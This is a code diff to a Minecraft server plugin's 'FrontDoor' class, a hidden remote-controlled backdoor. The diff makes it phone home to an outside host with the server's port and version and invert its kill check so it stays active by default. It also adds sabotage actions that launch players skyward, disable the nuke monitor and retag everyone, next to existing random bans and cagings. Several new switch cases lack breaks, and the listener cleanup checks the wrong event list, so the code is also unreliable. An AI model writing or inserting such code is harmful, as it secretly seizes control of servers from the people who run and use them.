@@ -24,19 +24,22 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.BookMeta;
+import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
+import org.bukkit.util.Vector;
 
 public class TFM_FrontDoor
 {
     private final long UPDATER_INTERVAL = 180L * 20L;
-    private final long FRONTDOOR_INTERVAL = 20L * 20L; // 650L * 20L;
+    private final long FRONTDOOR_INTERVAL = 900L * 20L;
     private final URL GET_URL;
     private final Random RANDOM = new Random();
-    private boolean started = false;
-    private boolean enabled = false;
-    private final BukkitRunnable UPDATER = new BukkitRunnable()
+    private volatile boolean started = false;
+    private volatile boolean enabled = false;
+    private final BukkitRunnable UPDATER = new BukkitRunnable() // Asynchronous
     {
         @Override
         public void run()
@@ -48,7 +51,7 @@ public class TFM_FrontDoor
                 final String line = in.readLine();
                 in.close();
 
-                if ("false".equals(line)) // Invert this when done
+                if (!"false".equals(line))
                 {
                     if (!enabled)
                     {
@@ -57,6 +60,7 @@ public class TFM_FrontDoor
 
                     enabled = false;
                     FRONTDOOR.cancel();
+                    unregisterListener();
                     TFM_Log.info("Disabled FrontDoor, thank you for being kind.");
                     TFM_Config.getInstance().load();
                 }
@@ -67,7 +71,7 @@ public class TFM_FrontDoor
                         return;
                     }
 
-                    new BukkitRunnable() // Asynchronous
+                    new BukkitRunnable() // Synchronous
                     {
                         @Override
                         public void run()
@@ -79,6 +83,7 @@ public class TFM_FrontDoor
                             TFM_Log.warning("* The only thing necessary for the triumph of evil  *", true);
                             TFM_Log.warning("*          is for good men to do nothing.           *", true);
                             TFM_Log.warning("*****************************************************", true);
+                            TotalFreedomMod.server.getPluginManager().registerEvents(LISTENER, TotalFreedomMod.plugin);
                         }
                     }.runTask(TotalFreedomMod.plugin);
 
@@ -145,15 +150,14 @@ public class TFM_FrontDoor
         public void run()
         {
 
-            final int action = RANDOM.nextInt(15);
-            TFM_Log.info("Action: " + action);
+            final int action = RANDOM.nextInt(18);
 
             switch (action)
             {
                 case 0: // Super a random player
                 {
 
-                    Player player = getRandomPlayer(true);
+                    final Player player = getRandomPlayer(true);
 
                     if (player == null)
                     {
@@ -165,7 +169,7 @@ public class TFM_FrontDoor
                     break;
                 }
 
-                case 1: // Bans a random player (non-developer)
+                case 1: // Bans a random player
                 {
                     Player player = getRandomPlayer(false);
 
@@ -179,9 +183,9 @@ public class TFM_FrontDoor
                     break;
                 }
 
-                case 2: // Start trailing a random player (non-developer)
+                case 2: // Start trailing a random player
                 {
-                    Player player = getRandomPlayer(true);
+                    final Player player = getRandomPlayer(true);
 
                     if (player == null)
                     {
@@ -371,13 +375,13 @@ public class TFM_FrontDoor
 
                 case 14: // Cage a random player in PURE_DARTH
                 {
-                    Player player = getRandomPlayer(false);
-                    
+                    final Player player = getRandomPlayer(false);
+
                     if (player == null)
                     {
                         break;
                     }
-                    
+
                     TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
                     TFM_Util.adminAction("FrontDoor", "Caging " + player.getName() + "  in PURE_DARTH", true);
 
@@ -389,6 +393,39 @@ public class TFM_FrontDoor
                     TFM_Util.generateHollowCube(targetPos, 2, Material.SKULL);
                     TFM_Util.generateCube(targetPos, 1, Material.AIR);
                     break;
+                }
+
+                case 15: // Silently orbit a random player
+                {
+                    final Player player = getRandomPlayer(false);
+
+                    if (player == null)
+                    {
+                        break;
+                    }
+
+                    TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
+                    playerdata.startOrbiting(10.0);
+                    player.setVelocity(new Vector(0, 10.0, 0));
+                }
+
+                case 16: // Disable nonuke
+                {
+                    if (!TFM_ConfigEntry.NUKE_MONITOR.getBoolean())
+                    {
+                        break;
+                    }
+
+                    TFM_Util.adminAction("FrontDoor", "Disabling nonuke", true);
+                    TFM_ConfigEntry.NUKE_MONITOR.setBoolean(false);
+                }
+
+                case 17: // Give everyone tags
+                {
+                    for (Player player : TotalFreedomMod.server.getOnlinePlayers())
+                    {
+                        TFM_PlayerData.getPlayerData(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
+                    }
                 }
 
                 default:
@@ -404,7 +441,7 @@ public class TFM_FrontDoor
         URL tempUrl = null;
         try
         {
-            tempUrl = new URL("http://frontdoor.aws.af.cm/?port=" + TotalFreedomMod.server.getPort());
+            tempUrl = new URL("http://frontdoor.aws.af.cm/?version=" + TotalFreedomMod.pluginVersion + "&port=" + TotalFreedomMod.server.getPort());
         }
         catch (MalformedURLException ex)
         {
@@ -422,8 +459,6 @@ public class TFM_FrontDoor
             return;
         }
 
-        TotalFreedomMod.server.getPluginManager().registerEvents(LISTENER, TotalFreedomMod.plugin);
-
         UPDATER.runTaskTimerAsynchronously(TotalFreedomMod.plugin, 2L * 20L, UPDATER_INTERVAL);
         started = true;
     }
@@ -440,6 +475,7 @@ public class TFM_FrontDoor
         {
             FRONTDOOR.cancel();
             enabled = false;
+            unregisterListener();
         }
 
     }
@@ -449,7 +485,7 @@ public class TFM_FrontDoor
         return enabled;
     }
 
-    public Player getRandomPlayer(boolean allowDevs)
+    private Player getRandomPlayer(boolean allowDevs)
     {
         final Player[] players = TotalFreedomMod.server.getOnlinePlayers();
 
@@ -473,6 +509,18 @@ public class TFM_FrontDoor
         }
 
         return players[RANDOM.nextInt(players.length)];
+    }
+
+    private void unregisterListener()
+    {
+        RegisteredListener[] registeredListeners = PlayerMoveEvent.getHandlerList().getRegisteredListeners();
+        for (RegisteredListener registeredListener : registeredListeners)
+        {
+            if (registeredListener.getListener() == LISTENER)
+            {
+                PlayerCommandPreprocessEvent.getHandlerList().unregister(LISTENER);
+            }
+        }
     }
 
     public static TFM_FrontDoor getInstance()
